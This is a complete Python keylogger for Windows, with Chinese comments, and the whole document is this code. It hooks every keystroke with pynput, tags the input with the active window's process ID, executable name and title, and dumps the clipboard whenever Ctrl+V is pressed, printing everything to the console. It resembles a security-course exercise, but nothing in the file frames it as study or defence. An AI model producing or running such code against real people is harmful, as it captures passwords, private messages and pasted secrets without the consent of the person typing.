from pynput import keyboard
import win32clipboard
from ctypes import windll, byref, create_string_buffer, c_ulong
import sys

class KeyLogger:
    def __init__(self):
        self.current_window = None
        self.user32 = windll.user32
        self.kernel32 = windll.kernel32
        self.psapi = windll.psapi

    def get_current_process(self):
        # 獲取當前視窗控制代碼
        hwnd = self.user32.GetForegroundWindow()
        pid = c_ulong(0)
        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        
        # 獲取執行檔名稱
        executable = create_string_buffer(512)
        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        self.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        
        # 獲取視窗標題
        window_title = create_string_buffer(512)
        self.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        
        new_window = window_title.value.decode(errors='ignore')
        
        # 如果視窗切換了，列印分隔線
        if new_window != self.current_window:
            self.current_window = new_window
            print(f"\n\n[ PID: {pid.value} - {executable.value.decode(errors='ignore')} - {self.current_window} ]")
        
        self.kernel32.CloseHandle(h_process)

    def on_press(self, key):
        # 每次按鍵前檢查視窗是否切換
        self.get_current_process()
        
        try:
            # 處理一般字元
            if hasattr(key, 'char') and key.char is not None:
                print(key.char, end='', flush=True)
            else:
                # 處理特殊按鍵
                key_str = str(key).replace('Key.', '')
                
                # 偵測 Ctrl+V (pynput 中 Ctrl+V 通常表現為 '\x16')
                if key == keyboard.KeyCode.from_char('\x16'):
                    try:
                        win32clipboard.OpenClipboard()
                        value = win32clipboard.GetClipboardData()
                        win32clipboard.CloseClipboard()
                        print(f"\n[PASTE] - {value}\n", end='', flush=True)
                    except Exception:
                        print(" [PASTE ERROR] ", end='', flush=True)
                else:
                    print(f" [{key_str}] ", end='', flush=True)
        except Exception as e:
            print(f" [Error: {e}] ", end='', flush=True)

    def run(self):
        print("監控啟動中... (按下 Ctrl+C 停止)")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == '__main__':
    logger = KeyLogger()
    try:
        logger.run()
    except KeyboardInterrupt:
        print("\n監控已停止。")
        sys.exit()